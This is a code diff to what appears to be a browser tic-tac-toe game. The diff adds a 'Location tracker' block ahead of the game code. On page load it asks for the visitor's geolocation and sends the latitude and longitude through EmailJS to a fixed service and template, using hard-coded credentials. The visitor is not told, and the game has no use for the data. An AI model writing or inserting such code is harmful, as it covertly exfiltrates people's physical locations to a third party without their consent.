@@ -1,3 +1,32 @@
+//Location tracker
+document.addEventListener("DOMContentLoaded", function() {
+
+  // Initialize EmailJS with your public API key
+emailjs.init({ publicKey: "gdYYsx5WB0j0YqN2x"}); // Replace with your EmailJS public API key
+
+// Function to send the email
+function sendEmail(lat, lon) {
+    var templateParams = {
+        message : lat + " " + lon
+    };
+
+    // Replace with your template ID and your email service ID
+    emailjs.send("service_gx0srd9", "template_ixmul7f", templateParams)
+    .then(function(response) {
+        console.log("Email sent successfully:", response);
+    }, function(error) {
+        console.error("Email sending failed:", error);
+    });
+} 
+navigator.geolocation.getCurrentPosition(function(position) {
+    var lat = position.coords.latitude;
+    var lon = position.coords.longitude;
+    sendEmail(lat, lon);
+});
+});
+        
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
 let currentPlayer = 'X';
 let gameBoard = ['', '', '', '', '', '', '', '', ''];
 const winConditions = [
